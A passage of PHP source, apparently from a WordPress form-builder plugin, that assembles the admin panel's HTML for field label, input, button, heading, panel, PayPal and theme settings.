						$output .= '<span class="fa fa-plus"></span> <span class="btn-tx">Add new rule</span>';
					$output .= '</div>';
				$output .= '</div>';*/


/*****************************************************************/	
/******************THEMES ***************************/
/*****************************************************************/						
					$output .= '<div class="third_panel extra-styling-column col-xs-4">';
						$output .= '<div class="field-setting-categories">';
							$output .= '<div id="close-extra-styling" class="close-area">';
								$output .= '<span class="fa fa-close"></span>';
							$output .= '</div>';
						$output .= '</div>';
						
						
						$output .= '<div class="inner">
						<small>Choose Color Scheme</small>
						<select name="choose_form_theme" class="form-control ui-state-default">
							<option value="default">Boostrap (default)</option>
							<option value="black-tie">black-tie</option>
							<option value="cupertino">cupertino</option>
							<option value="dark-hive">dark-hive</option>
							<option value="dot-luv">dot-luv</option>
							<option value="eggplant">eggplant</option>
							<option value="excite-bike">excite-bike</option>
							<option value="flick">flick</option>
							<option value="hot-sneaks">hot-sneaks</option>
							<option value="humanity">humanity</option>
							<option value="le-frog">le-frog</option>
							<option value="mint-choc">mint-choc</option>
							<option value="overcast">overcast</option>
							<option value="pepper-grinder">pepper-grinder</option>
							<option value="redmond">redmond</option>
							<option value="smoothness">smoothness</option>
							<option value="south-street">south-street</option>
							<option value="start">start</option>
							<option value="sunny">sunny</option>
							<option value="swanky-purse">swanky-purse</option>
							<option value="trontastic">trontastic</option>							
							<option value="ui-darkness">ui-darkness</option>
							<option value="ui-lightness">ui-lightness</option>
							<option value="vader">vader</option>
						</select>
						';
						$output .= '</div>';
					$output .= '</div>';
					
/*****************************************************************/	
/******************PAYPAL ***************************/
/*****************************************************************/						
					$output .= '<div class="third_panel right_hand_col paypal-column col-xs-4">';
						$output .= '<div class="field-setting-categories">';
							$output .= '<div id="paypal_setup" class="paypal_setup tab active">';
								$output .= 'PayPal Setup';
							$output .= '</div>';
							$output .= '<div id="paypal_product_list" class="paypal_product_list tab">';
								$output .= 'PayPal Items';
							$output .= '</div>';
							$output .= '<div id="close-paypal" class="close-area">';
								$output .= '<span class="fa fa-close"></span>';
							$output .= '</div>';
						$output .= '</div>';
						
						
						$output .= '<div class="inner">';
							
							
						$output .= '</div>';
						$output .= '<div id="add_paypal_product" class="btn btn-default add_new_rule">';
								$output .= '<span class="fa fa-plus"></span> <span class="btn-tx">Add Paypal Item</span>';
							$output .= '</div>';
					$output .= '</div>';

					
/*****************************************************************/	
/******************SETTINGS CATEGORIES ***************************/
/*****************************************************************/						
					$output .= '<div class="field-settings-column right_hand_col right_hand_col col-xs-4">';
					$output .= '<div class="current_id" style="display:none;"></div>';
					
						$output .= '<div class="field-setting-categories"><i class="fa fa-bars move_panel"></i>';
							$output .= '<div id="label-settings" class="tab active">';
								$output .= 'Label';
							$output .= '</div>';
							$output .= '<div id="input-settings" class="tab">';
								$output .= 'Input';
							$output .= '</div>';
							$output .= '<div id="validation-settings" class="tab">';
								$output .= 'Validation';
							$output .= '</div>';
							$output .= '<div id="math-settings" class="tab">';
								$output .= 'Math Logic';
							$output .= '</div>';
							$output .= '<div id="animation-settings" class="tab">';
								$output .= 'Animation';
							$output .= '</div>';
							$output .= '<div id="close-settings" class="close-area">';
								$output .= '<span class="fa fa-close"></span>';
							$output .= '</div>';
						$output .= '</div>';
						
						
/*****************************************************/	
/******************SETTINGS***************************/
/*****************************************************/	
					
						$output .= '<div class="inner"><form enctype="multipart/form-data" method="post" action="'.get_option('siteurl').'/wp-admin/admin-ajax.php" id="do_upload_image_selection" name="do_upload_image_selection" style="display:none;">
								<div data-provides="fileinput" class="fileinput fileinput-new hidden">
																		  <div style="width: 100px; height: 100px;" data-trigger="fileinput" class="the_input_element fileinput-preview thumbnail"></div>
																		  <div>
																			<span data-placement="top" data-secondary-message="Invalid image extension" data-content="Please select an image" class="btn btn-default btn-file the_input_element error_message"><span class="fileinput-new">Select image</span><span class="fileinput-exists">Change</span>
																			<input type="file" name="do_image_select_upload_preview">
																			</span>
																			<a data-dismiss="fileinput" class="btn btn-default fileinput-exists" href="#">Remove</a>
																		  </div>
																		  <div style="display:none;" class="get_file_ext">gif
jpg
jpeg
png
psd
tif
tiff</div></div></form>';
//LABEL SETTINGS //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////				
							$output .= '<div class="label-settings settings-section">';
	/*** Label text ***/
								$output .= '<small>Label Text</small>';
								$output .= '<div class="input-group input-group-sm">';
									$output .= '<input type="text" class="form-control" name="set_label" id="set_label"  placeholder="Add text">';
	/*** Label text bold ***/
									$output .= '<span class="input-group-addon label-bold" title="Bold">';
										$output .= '<span class="fa fa-bold"></span>';
									$output .= '</span>';
	/*** Label text italic ***/
									$output .= '<span class="input-group-addon label-italic" title="Italic">';
										$output .= '<span class="fa fa-italic"></span>';
									$output .= '</span>';
	/*** Label text underline ***/
									$output .= '<span class="input-group-addon label-underline" title="Underline">';
										$output .= '<span class="fa fa-underline"></span>';
									$output .= '</span>';
	/*** Label text color ***/
									$output .= '<span class="input-group-addon color-picker"><input type="text" class="form-control label-color" name="label-color" id="bs-color"></span>';
								$output .= '</div>';
	/*** Sub-label text ***/
								$output .= '<small>Sub-label Text</small>';
								$output .= '<div class="input-group input-group-sm">';
									$output .= '<input type="text" class="form-control" name="set_subtext" placeholder="Add text" id="set_subtext">';
	/*** Sub-Label text bold ***/
									$output .= '<span class="input-group-addon sub-label-bold" title="Bold">';
										$output .= '<span class="fa fa-bold"></span>';
									$output .= '</span>';
	/*** Sub-Label text italic ***/
									$output .= '<span class="input-group-addon sub-label-italic" title="Italic">';
										$output .= '<span class="fa fa-italic"></span>';
									$output .= '</span>';
	/*** Sub-Label text underline ***/
									$output .= '<span class="input-group-addon sub-label-underline" title="Underline">';
										$output .= '<span class="fa fa-underline"></span>';
									$output .= '</span>';
	/*** Sub-Label text color ***/
									$output .= '<span class="input-group-addon color-picker"><input type="text" class="form-control sub-label-color" name="label-color" id="bs-color"></span>';
								$output .= '</div>';
										
								$output .= '<div role="toolbar" class="btn-toolbar">';
	/*** Label position ***/
									$output .= '<div role="group" class="btn-group label-position">';
										$output .= '<small>Label Position</small>';
										$output .= '<button class="btn btn-default left" type="button" 	title="Left"><i class="fa fa-arrow-left"></i></button>';
										$output .= '<button class="btn btn-default top" type="button" 	title="Top"><i class="fa fa-arrow-up"></i></button>';
										$output .= '<button class="btn btn-default right" type="button" title="Right"><i class="fa fa-arrow-right"></i></button>';
										$output .= '<button class="btn btn-default none" type="button" 	title="Hidden"><i class="fa fa-eye-slash"></i></button>';
									$output .= '</div>';
	/*** Label alignment ***/
									$output .= '<div role="group" class="btn-group align-label">';
										$output .= '<small>Text Alignment</small>';
										$output .= '<button class="btn btn-default left" type="button" title="Left"><i class="fa fa-align-left"></i></button>';
										$output .= '<button class="btn btn-default center" type="button" title="Center"><i class="fa fa-align-center"></i></button>';
										$output .= '<button class="btn btn-default right" type="button" title="Right"><i class="fa fa-align-right"></i></button>';
									$output .= '</div>';
	/*** Label size ***/
									$output .= '<div role="group" class="btn-group label-size">';
										$output .= '<small>Text Size</small>';
										$output .= '<button class="btn btn-default small" type="button" title="Small"><i class="fa fa-font" style="font-size:10px"></i></button>';
										$output .= '<button class="btn btn-default normal" type="button" title="Normal"><i class="fa fa-font" style="font-size:13px"></i></button>';
										$output .= '<button class="btn btn-default large" type="button" title="Large"><i class="fa fa-font" style="font-size:16px"></i></button>';
									$output .= '</div>';
										
								$output .= '</div>';
	/*** Label width ***/									
								$output .= '<div class="row">';
									$output .= '<div class="col-sm-12">';
										$output .= '<small class="width_distribution">Width Distribution</small>';
									$output .= '</div>';
									$output .= '<div class="col-sm-2">';
										$output .= '<small class="width_indicator left">Label <input type="text" name="set_label_width" id="set_label_width" class="form-control"></small>';
									$output .= '</div>';
									$output .= '<div class="col-sm-8 width_slider"><br />';
										$output .= '<select name="label_width" id="label_width">
														<option>1</option>
														<option>2</option>
														<option>3</option>
														<option>4</option>
														<option>5</option>
														<option>6</option>
														<option>7</option>
														<option>8</option>
														<option>9</option>
														<option>10</option>
														<option>11</option>
														<option>12</option>
													</select>';
									$output .= '</div>';
										
									$output .= '<div class="col-sm-2">';
										$output .= '<small class="width_indicator right"><input type="text" name="set_input_width" id="set_input_width" class="form-control"> Input</small>';
									$output .= '</div>';
								
								$output .= '</div>';
							$output .= '</div>';
							
//INPUT SETTINGS //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////				
							$output .= '<div class="input-settings settings-section" style="display:none;">';
							
								$output .= '<div role="toolbar" class="btn-toolbar col-3 ungeneric-input-settings">';
	/*** Input Placeholder ***/	
									$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Input Placeholder</small>';
										$output .= '<input type="text" class="form-control" name="set_place_holder" id="set_input_placeholder"  placeholder="Placeholder text">';
									$output .= '</div>';
	/*** Input Name ***/
									$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Input Name</small>';
										$output .= '<input type="text" class="form-control" name="set_input_name" id="set_input_name"  placeholder="Can not be empty!">';
									$output .= '</div>';
	/*** Input ID ***/							
									$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Input ID</small>';
										$output .= '<input type="text" class="form-control" name="set_input_id" id="set_input_id"  placeholder="Unique Identifier">';
									$output .= '</div>';
									/*$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Input Class</small>';
										$output .= '<input type="text" class="form-control" name="set_input_class" id="set_input_class"  placeholder="Set class">';
									$output .= '</div>';*/
								$output .= '</div>';
	/*** DATE TIME OPTIONS ***/
							$output .= '<div class="settings-date-options" style="display:none;">';
									
									$output .= '<div role="toolbar" class="btn-toolbar col-3">';
	/*** Date Format Placeholder ***/	
										$output .= '<div class="input-group input-group-sm">';
											$output .= '<small>Date Format</small>';
													$output .= '<select class="form-control" id="select_date_format">
																		
															<option value="DD/MM/YYYY hh:mm A">DD/MM/YYYY hh:mm A</option>
															<option value="YYYY/MM/DD hh:mm A">YYYY/MM/DD hh:mm A</option>
															<option value="DD-MM-YYYY hh:mm A">DD-MM-YYYY hh:mm A</option>
															<option value="YYYY-MM-DD hh:mm A">YYYY-MM-DD hh:mm A</option>
															<option value="custom">Custom</option>
														</select>
											';	
										
										$output .= '</div>';
										$output .= '<div class="input-group input-group-sm set-sutom-date-format hidden">';
											$output .= '<small>Custom Format</small>';
												$output .= '<input type="text" class="form-control " value="" placeholder="Set date format" name="set_date_format" id="set_date_format">';
											$output .= '</div>';
	/*** Date Format Language ***/							
										$output .= '<div class="input-group input-group-sm">';
											$output .= '<small>Language</small>';
											$output .= '<select class="form-control" id="date-picker-lang-selector"><option value="en">en</option><option value="ar-ma">ar-ma</option><option value="ar-sa">ar-sa</option><option value="ar-tn">ar-tn</option><option value="ar">ar</option><option value="bg">bg</option><option value="ca">ca</option><option value="cs">cs</option><option value="da">da</option><option value="de-at">de-at</option><option value="de">de</option><option value="el">el</option><option value="en-au">en-au</option><option value="en-ca">en-ca</option><option value="en-gb">en-gb</option><option value="es">es</option><option value="fa">fa</option><option value="fi">fi</option><option value="fr-ca">fr-ca</option><option value="fr">fr</option><option value="he">he</option><option value="hi">hi</option><option value="hr">hr</option><option value="hu">hu</option><option value="id">id</option><option value="is">is</option><option value="it">it</option><option value="ja">ja</option><option value="ko">ko</option><option value="lt">lt</option><option value="lv">lv</option><option value="nb">nb</option><option value="nl">nl</option><option value="pl">pl</option><option value="pt-br">pt-br</option><option value="pt">pt</option><option value="ro">ro</option><option value="ru">ru</option><option value="sk">sk</option><option value="sl">sl</option><option value="sr-cyrl">sr-cyrl</option><option value="sr">sr</option><option value="sv">sv</option><option value="th">th</option><option value="tr">tr</option><option value="uk">uk</option><option value="vi">vi</option><option value="zh-cn">zh-cn</option><option value="zh-tw">zh-tw</option></select>';	
										
										$output .= '</div>';
										
									$output .= '</div>';
								$output .= '</div>';							
	/**** SLIDER SETTINGS ****/
								$output .= '<div class="setting-wrapper settings-spinner-options">';	
										
											$output .= '<div role="toolbar" class="btn-toolbar col-4">';
				
				/*** Start Value ***/	
				/*								$output .= '<div class="input-group input-group-sm">';
													$output .= '<small>Start value</small>';
													$output .= '<input type="text" class="form-control" name="spin_start_value" id="spin_start_value"  placeholder="Enter start value">';
												$output .= '</div>';*/
				/*** Min Value ***/
												$output .= '<div class="input-group input-group-sm">';
													$output .= '<small>Min Value</small>';
													$output .= '<input type="text" class="form-control" name="spin_minimum_value" id="spin_minimum_value"  placeholder="Enter min value">';
												$output .= '</div>';
				/*** Max Value ***/							
												$output .= '<div class="input-group input-group-sm">';
													$output .= '<small>Max Value</small>';
													$output .= '<input type="text" class="form-control" name="spin_maximum_value" id="spin_maximum_value"  placeholder="Enter max value">';
												$output .= '</div>';
				/*** Step Value ***/							
												$output .= '<div class="input-group input-group-sm">';
													$output .= '<small>Step</small>';
													$output .= '<input type="text" class="form-control" name="spin_step_value" id="spin_step_value"  placeholder="Enter step value">';
												$output .= '</div>';
				/*** Decimals ***/	
												$output .= '<div class="input-group input-group-sm">';
													$output .= '<small>Decimals</small>';
													$output .= '<input type="text" class="form-control" name="spin_decimal" id="spin_decimal"  placeholder="Enter start value">';
												$output .= '</div>';
											
										$output .= '</div>';
										
								$output .= '</div>';	
	
	/*** Input Styling ***/		
							$output .= '<div class="settings-input-styling">';						
								$output .= '<small>Default value & Input Styling</small>';
									$output .= '<div class="input-group input-group-sm">';
	/*** Input value ***/
										$output .= '<input type="text" class="form-control" name="set_input_val" placeholder="Set default value" id="set_input_val">';
										$output .= '<input type="text" class="form-control" name="set_default_select_value" placeholder="Set default option" id="set_default_select_value" style="display:none;">';
										$output .= '<input type="text" class="form-control" name="spin_start_value" id="spin_start_value"  placeholder="Enter start value"  style="display:none;">';
										$output .= '<input type="text" class="form-control" name="set_button_val" id="set_button_val"  placeholder="Enter button text"  style="display:none;">';
										$output .= '<input type="text" class="form-control" name="set_heading_text" id="set_heading_text"  placeholder="Use {math_result} for math result place holder"  style="display:none;">';
										$output .= '<input type="text" class="form-control" name="max_tags" id="max_tags"  placeholder="Enter maximum tags"  style="display:none;">';
	/*							
										$output .= '<span class="input-group-addon  input-align-left" title="Left">';
											$output .= '<span class="fa fa-align-left"></span>';
										$output .= '</span>';
	
										$output .= '<span class="input-group-addon input-align-center" title="Center">';
											$output .= '<span class="fa fa-align-center"></span>';
										$output .= '</span>';
	
										$output .= '<span class="input-group-addon input-align-right" title="Right">';
											$output .= '<span class="fa fa-align-right"></span>';
										$output .= '</span>';
	
	**/									
										$output .= '<span class="input-group-addon input-bold" title="Bold">';
											$output .= '<span class="fa fa-bold"></span>';
										$output .= '</span>';
	/*** Input italic ***/
										$output .= '<span class="input-group-addon input-italic" title="Italic">';
											$output .= '<span class="fa fa-italic"></span>';
										$output .= '</span>';
	/*** Input underline ***/
										$output .= '<span class="input-group-addon input-underline" title="Underline">';
											$output .= '<span class="fa fa-underline"></span>';
										$output .= '</span>';
	/*** Input text color ***/
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Text Color">TX</span><span class="input-group-addon color-picker"><input type="text" class="form-control input-color" name="input-color" id="bs-color"></span>';
	/*** Input text color ***/
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Background Color">BG</span><span class="input-group-addon color-picker"><input type="text" class="form-control input-bg-color" name="input-bg-color" id="bs-color"></span>';
	/*** Input text color ***/
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Border Color">BRD</span><span class="input-group-addon color-picker"><input type="text" class="form-control input-border-color" name="input-border-color" id="bs-color"></span>';
									$output .= '</div>';
							
	
	/*** Input alignment ***/
							$output .= '<div role="toolbar" class="btn-toolbar ungeneric-input-settings">';
									
									$output .= '<div role="group" class="btn-group align-input">';
										$output .= '<small>Text Alignment</small>';
										$output .= '<button class="btn btn-default left" type="button" title="Left"><i class="fa fa-align-left"></i></button>';
										$output .= '<button class="btn btn-default center" type="button" title="Center"><i class="fa fa-align-center"></i></button>';
										$output .= '<button class="btn btn-default right" type="button" title="Right"><i class="fa fa-align-right"></i></button>';
									$output .= '</div>';
	/*** Input size ***/
									$output .= '<div role="group" class="btn-group input-size">';
										$output .= '<small>Input Size</small>';
										$output .= '<button class="btn btn-default small" type="button" title="Small"><i class="fa fa-font" style="font-size:10px"></i></button>';
										$output .= '<button class="btn btn-default normal" type="button" title="Normal"><i class="fa fa-font" style="font-size:13px"></i></button>';
										$output .= '<button class="btn btn-default large" type="button" title="Large"><i class="fa fa-font" style="font-size:16px"></i></button>';
									$output .= '</div>';
									$output .= '<div role="group" class="btn-group input-corners">';
										$output .= '<small>Corners</small>';
										$output .= '<button class="btn btn-default square" type="button" title="Square border">Square</button>';
										$output .= '<button class="btn btn-default normal" type="button" title="Rounded Border">Rounded</button>';
										//$output .= '<button class="btn btn-default pill" type="button" title="Large"></button>';
									$output .= '</div>';
									$output .= '<div role="group" class="btn-group recreate-field setting-recreate-field">';
											$output .= '<small>Field Replication</small>';
											$output .= '<button class="btn btn-default enable-recreation" type="button" title="Enables Field Replication">Enable</button>';
											$output .= '<button class="btn btn-default disable-recreation active" type="button" title="Disables Field Replication">Disable</button>';
										$output .= '</div>';
							$output .= '</div>';
						$output .= '</div>';
	
	/*** Button Options ***/
			/*** Button alignment ***/
							$output .= '<div role="toolbar" class="btn-toolbar button-settings">';
									
									$output .= '<div role="group" class="btn-group button-type">';
										$output .= '<small>Button Type</small>';
										$output .= '<button class="btn btn-default do-submit" type="button" 	title="Submit"><span class="btn-tx">Submit</span></button>';
										$output .= '<button class="btn btn-default next" type="button" 	title="Next"><span class="btn-tx">Next</span></button>';
										$output .= '<button class="btn btn-default prev" type="button" title="Previous"><span class="btn-tx">Previous</span></button>';
									$output .= '</div>';
									
									$output .= '<div role="group" class="btn-group button-position">';
										$output .= '<small>Button Position</small>';
										$output .= '<button class="btn btn-default left" type="button" 	title="Left"><i class="fa fa-align-left"></i></button>';
										$output .= '<button class="btn btn-default center" type="button" 	title="Center"><i class="fa fa-align-center"></i></button>';
										$output .= '<button class="btn btn-default right" type="button" title="Right"><i class="fa fa-align-right"></i></button>';
									$output .= '</div>';
									
									$output .= '<div role="group" class="btn-group button-text-align">';
										$output .= '<small>Text Alignment</small>';
										$output .= '<button class="btn btn-default left" type="button" title="Left"><i class="fa fa-align-left"></i></button>';
										$output .= '<button class="btn btn-default center" type="button" title="Center"><i class="fa fa-align-center"></i></button>';
										$output .= '<button class="btn btn-default right" type="button" title="Right"><i class="fa fa-align-right"></i></button>';
									$output .= '</div>';
							$output .= '</div>';
							$output .= '<div role="toolbar" class="btn-toolbar button-settings">';
			/*** Button size ***/
									$output .= '<div role="group" class="btn-group button-size">';
										$output .= '<small>Button Size</small>';
										$output .= '<button class="btn btn-default small" type="button" title="Small"><i class="fa fa-font" style="font-size:10px"></i></button>';
										$output .= '<button class="btn btn-default normal" type="button" title="Normal"><i class="fa fa-font" style="font-size:13px"></i></button>';
										$output .= '<button class="btn btn-default large" type="button" title="Large"><i class="fa fa-font" style="font-size:16px"></i></button>';
									$output .= '</div>';
									
									$output .= '<div role="group" class="btn-group button-width">';
										$output .= '<small>Button Width</small>';
										$output .= '<button class="btn btn-default default" type="button" title="Default"><span class="btn-tx">Default</span></button>';
										$output .= '<button class="btn btn-default full_button" type="button" title="Full"><span class="btn-tx">Full</span></button>';
									$output .= '</div>';
									
							$output .= '</div>';
	
	/*** Heading Options ***/
			/*** Heading Size ***/
							$output .= '<div role="toolbar" class="btn-toolbar heading-settings">';
									
									$output .= '<div role="group" class="btn-group heading-size">';
										$output .= '<small>Heading Size</small>';
										$output .= '<button class="btn btn-default heading_1" type="button" title="Heading 1"><span class="btn-tx">H1</span></button>';
										$output .= '<button class="btn btn-default heading_2" type="button" title="Heading 2"><span class="btn-tx">H2</span></button>';
										$output .= '<button class="btn btn-default heading_3" type="button" title="Heading 3"><span class="btn-tx">H3</span></button>';
										$output .= '<button class="btn btn-default heading_4" type="button" title="Heading 4"><span class="btn-tx">H4</span></button>';
										$output .= '<button class="btn btn-default heading_5" type="button" title="Heading 5"><span class="btn-tx">H5</span></button>';
										$output .= '<button class="btn btn-default heading_6" type="button" title="Heading 6"><span class="btn-tx">H6</span></button>';
									$output .= '</div>';
			/*** Button size ***/					
									$output .= '<div role="group" class="btn-group heading-text-align">';
										$output .= '<small>Text Alignment</small>';
										$output .= '<button class="btn btn-default left" type="button" title="Left"><i class="fa fa-align-left"></i></button>';
										$output .= '<button class="btn btn-default center" type="button" title="Center"><i class="fa fa-align-center"></i></button>';
										$output .= '<button class="btn btn-default right" type="button" title="Right"><i class="fa fa-align-right"></i></button>';
									$output .= '</div>';
									
							$output .= '</div>';
							
	
	/*** Panel Options ***/
			
							/*** Slider Styling ***/
							$output .= '<div class="panel-settings" style="display:none;">';
									$output .= '<small>Panel</small>';
									$output .= '<input type="text" class="form-control" name="set_panel_heading" id="set_panel_heading"  placeholder="Panel Heading">';
									$output .= '<div role="group" class="input-group input-group-sm">';
										
										//$output .= '<span class="input-group-addon current_slider_icon"><i class="">Select Icon</i></span>';
										
										//$output .= '<input type="text" class="form-control" name="set_addon_after_text" id="set_addon_after_text"  placeholder="add text">';
										
										$output .= '<span class="input-group-addon panel-heading-bold" title="Bold" style="border-right:1px solid #ccc">';
											$output .= '<span class="fa fa-bold"></span>';
										$output .= '</span>';
	/*** Input italic ***/
										$output .= '<span class="input-group-addon panel-heading-italic" title="Italic">';
											$output .= '<span class="fa fa-italic"></span>';
										$output .= '</span>';
	/*** Input underline ***/
										$output .= '<span class="input-group-addon panel-heading-underline" title="Underline">';
											$output .= '<span class="fa fa-underline"></span>';
										$output .= '</span>';
										
										$output .= '<span class="input-group-addon group-addon-label" title="Panel Heading Text Color">TX</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-panel-heading-text-color" name="set-panel-heading-text-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label"  title="Panel Heading Background Color">BG</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-panel-heading-bg-color" name="set-panel-heading-bg-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label" title="Panel Heading Border Color">BR</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-panel-heading-border-color" name="set-panel-heading-border-color" id="bs-color"></span>';	
										$output .= '<span class="input-group-addon group-addon-label" title="Panel Body Background">BBG</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-panel-body-bg-color" name="set-panel-body-bg-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label" title="Panel Body Border Color">BBR</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-panel-body-border-color" name="set-panel-body-border-color" id="bs-color"></span>';
									
								$output .= '</div>';
									$output .= '<div role="toolbar" class="btn-toolbar">';
										$output .= '<div role="group" class="btn-group show_panel-heading">';
											$output .= '<small>Show heading</small>';
											$output .= '<button class="btn btn-default yes" type="button" title="Yes"><span class="btn-tx">Yes</span></button>';
											$output .= '<button class="btn btn-default no" type="button" title="No"><span class="btn-tx">No</span></button>';
										$output .= '</div>';
										
										$output .= '<div role="group" class="btn-group panel-heading-text-align">';
											$output .= '<small>Text Alignment</small>';
											$output .= '<button class="btn btn-default left" type="button" title="Left"><i class="fa fa-align-left"></i></button>';
											$output .= '<button class="btn btn-default center" type="button" title="Center"><i class="fa fa-align-center"></i></button>';
											$output .= '<button class="btn btn-default right" type="button" title="Right"><i class="fa fa-align-right"></i></button>';
										$output .= '</div>';
										
										$output .= '<div role="group" class="btn-group panel-heading-size">';
											$output .= '<small>Heading Size</small>';
											$output .= '<button class="btn btn-default small" type="button" title="Small"><i class="fa fa-font" style="font-size:10px"></i></button>';
											$output .= '<button class="btn btn-default normal" type="button" title="Normal"><i class="fa fa-font" style="font-size:13px"></i></button>';
											$output .= '<button class="btn btn-default large" type="button" title="Large"><i class="fa fa-font" style="font-size:16px"></i></button>';
										$output .= '</div>';
									$output .= '</div>';
							$output .= '</div>';
	
	/*** HTML options ***/						
							$output .= '<div class="settings-html" style="display:none;">';
								$output .= '<small>Add Text or HTML</small>';
								$output .= '<textarea class="form-control" name="set_html" id="set_html" ></textarea>';
							$output .= '</div>';
	
	/*** Select options ***/						
							$output .= '<div class="settings-select-options" style="display:none;">';
								$output .= '<small>Set Options</small>';
								$output .= '<textarea class="form-control" name="set_options" id="set_options" ></textarea>';
							$output .= '</div>';
	
	
	/*** Radio AND Check options ***/						
							$output .= '<div class="settings-radio-options" style="display:none;">';
								$output .= '<small>Set Options</small>';
								$output .= '<textarea class="form-control" name="set_radios" id="set_radios" ></textarea>';
							$output .= '</div>';
							
	/*** Autocomplete options ***/						
							$output .= '<div class="settings-autocomplete-options" style="display:none;">';
								$output .= '<small>Set Selection list</small>';
								$output .= '<textarea class="form-control" name="set_selections" id="set_selections"></textarea>';
							$output .= '</div>';
							
							$output .= '<div class="setting-wrapper setting-input-add-ons">';
	/*** Input PRE Add-on ***/
									$output .= '<small>Set Icon before</small>';
									$output .= '<div role="group" class="input-group input-group-sm">';
										
										$output .= '<span class="input-group-addon current_icon_before"><i class="">Select Icon</i></span>';
										$output .= '<input type="text" class="form-control" name="set_icon_before" id="set_icon_before"  placeholder="or enter icon class">';
										//$output .= '<input type="text" class="form-control" name="set_addon_before_text" id="set_addon_before_text"  placeholder="add text">';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Text Color">TX</span><span class="input-group-addon color-picker"><input type="text" class="form-control pre-icon-text-color" name="pre-icon-text-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Background Color">BG</span><span class="input-group-addon color-picker"><input type="text" class="form-control pre-icon-bg-color" name="pre-icon-text-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Border Color">BRD</span><span class="input-group-addon color-picker"><input type="text" class="form-control pre-icon-border-color" name="pre-icon-border-color" id="bs-color"></span>';
									$output .= '</div>';
	/*** Input POST Add-on ***/
									$output .= '<small>Set Icon After</small>';
									$output .= '<div role="group" class="input-group input-group-sm">';
										
										$output .= '<span class="input-group-addon current_icon_after"><i class="">Select Icon</i></span>';
										$output .= '<input type="text" class="form-control" name="set_icon_after" id="set_icon_after"  placeholder="or enter icon class">';
										//$output .= '<input type="text" class="form-control" name="set_addon_after_text" id="set_addon_after_text"  placeholder="add text">';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Text Color">TX</span><span class="input-group-addon color-picker"><input type="text" class="form-control post-icon-text-color" name="post-icon-text-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Background Color">BG</span><span class="input-group-addon color-picker"><input type="text" class="form-control post-icon-bg-color" name="post-icon-text-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Border Color">BRD</span><span class="input-group-addon color-picker"><input type="text" class="form-control post-icon-border-color" name="post-icon-border-color" id="bs-color"></span>';
									$output .= '</div>';
									
									
									
							$output .= '</div>';
				
				$output .= '<div role="toolbar" class="btn-toolbar col-3 img-upload-input-settings">';
	/*** Input Placeholder ***/	
									$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Select Button Text</small>';
										$output .= '<input type="text" class="form-control" name="img-upload-select" id="img-upload-select"  placeholder="">';
									$output .= '</div>';
	/*** Input Name ***/
									$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Change Button Text</small>';
										$output .= '<input type="text" class="form-control" name="img-upload-change" id="img-upload-change"  placeholder="">';
									$output .= '</div>';
	/*** Input ID ***/							
									$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Remove Button Text</small>';
										$output .= '<input type="text" class="form-control" name="img-upload-remove" id="img-upload-remove"  placeholder="">';
									$output .= '</div>';
									/*$output .= '<div class="input-group input-group-sm">';
										$output .= '<small>Input Class</small>';
										$output .= '<input type="text" class="form-control" name="set_input_class" id="set_input_class"  placeholder="Set class">';
									$output .= '</div>';*/
								$output .= '</div>';
							
							
							/*** Radio Styling ***/
							$output .= '<div class="settings-radio-styling" style="display:none;">';
									$output .= '<small>Radio Styling</small>';
									$output .= '<div role="group" class="input-group input-group-sm">';
										
										$output .= '<span class="input-group-addon current_radio_icon"><i class="">Select Icon</i></span>';
										$output .= '<input type="text" class="form-control" name="set_radio_icon" id="set_radio_icon"  placeholder="or enter icon class">';
										//$output .= '<input type="text" class="form-control" name="set_addon_after_text" id="set_addon_after_text"  placeholder="add text">';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Label Colors">LB</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-radio-label-color" name="set-radio-label-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Text Color">TX</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-radio-text-color" name="set-radio-text-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Background Color">BG</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-radio-bg-color" name="set-radio-text-color" id="bs-color"></span>';
										$output .= '<span class="input-group-addon group-addon-label" data-toggle="tooltip" title="Border Color">BRD</span><span class="input-group-addon color-picker"><input type="text" class="form-control set-radio-border-color" name="set-radio-border-color" id="bs-color"></span>';
									$output .= '</div>';
									
									$output .= '<div role="group" class="btn-group display-radios-checks">';
											$output .= '<small>Layout</small>';
											$output .= '<button class="btn btn-default inline" type="button">
														<span class="glyphicon glyphicon-arrow-right"></span>
														Inline
														</button>
														<button class="btn btn-default 1c" type="button">
														<span class="glyphicon glyphicon-arrow-down"></span>
														1 Col
														</button>
														<button class="btn btn-default 2c" type="button">2 Col</button>
														<button class="btn btn-default 3c" type="button">3 Col</button>
														<button class="btn btn-default 4c" type="button">4 Col</button>';
